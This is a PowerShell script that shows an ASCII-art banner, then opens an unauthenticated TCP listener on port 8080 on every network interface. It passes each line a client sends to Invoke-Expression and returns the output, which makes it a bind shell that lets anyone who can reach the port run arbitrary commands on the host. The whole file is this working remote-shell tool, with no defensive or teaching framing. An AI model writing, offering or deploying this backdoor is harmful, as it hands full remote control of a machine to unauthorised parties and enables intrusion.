Write-Host @"

          _____                    _____                    _____                   _______                 
         /\    \                  /\    \                  /\    \                 /::\    \                
        /::\    \                /::\    \                /::\    \               /::::\    \               
        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
 /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
 \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
      \:::\    \               \::::::/    /                                      \::::/    /               
       \:::\____\               \::::/    /                                        \::/____/                
        \::/    /                \::/    /                                          ~~                      
         \/____/                  \/____/                                                                   
                                                                                                            

"@

# Set up TCP listener
$listener = New-Object System.Net.Sockets.TcpListener ([System.Net.IPAddress]::Any, 8080)
$listener.Start()

Write-Host "Listening for connections on port 8080..."

while ($true) {
    if ($listener.Pending()) {
        $client = $listener.AcceptTcpClient()
        Write-Host "Client connected: $($client.Client.RemoteEndPoint)"
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
	$writer.Write("
		
          _____                    _____                    _____                   _______                 
         /\    \                  /\    \                  /\    \                 /::\    \                
        /::\    \                /::\    \                /::\    \               /::::\    \               
        \:::\    \              /::::\    \              /::::\    \             /::::::\    \              
         \:::\    \            /::::::\    \            /::::::\    \           /::::::::\    \             
          \:::\    \          /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \            
           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \           
           /::::\    \       \:::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \          
  ____    /::::::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\         
 /\   \  /:::/\:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\    \ |:::|    |     |:::|    |        
/::\   \/:::/  \:::\____\/::\   \:::\   \:::\____\/:::/  \:::\   \:::\____\|:::|____|     |:::|    |        
\:::\  /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\   \::/    / \:::\    \   /:::/    /         
 \:::\/:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\   \/____/   \:::\    \ /:::/    /          
  \::::::/    /            \:::\   \:::\    \               \:::\    \        \:::\    /:::/    /           
   \::::/____/              \:::\   \:::\____\               \:::\____\        \:::\__/:::/    /            
    \:::\    \               \:::\  /:::/    /                \::/    /         \::::::::/    /             
     \:::\    \               \:::\/:::/    /                  \/____/           \::::::/    /              
      \:::\    \               \::::::/    /                                      \::::/    /               
       \:::\____\               \::::/    /                                        \::/____/                
        \::/    /                \::/    /                                          ~~                      
         \/____/                  \/____/                                                                   
                                                                                                            

")
        while ($client.Connected) {
            # Display a prompt
	
            $writer.Write("PS > ")
            $writer.Flush()

            $data = $reader.ReadLine()
            if ($data -eq $null) {
                break
            }

            # Execute command and capture the output as a string
            $output = Invoke-Expression -Command $data | Out-String

            # Echo back to the client
            $writer.WriteLine($output)
            $writer.Flush()
        }

        Write-Host "Client disconnected: $($client.Client.RemoteEndPoint)"
        $client.Close()
    }

    Start-Sleep -Seconds 1
}

$listener.Stop()
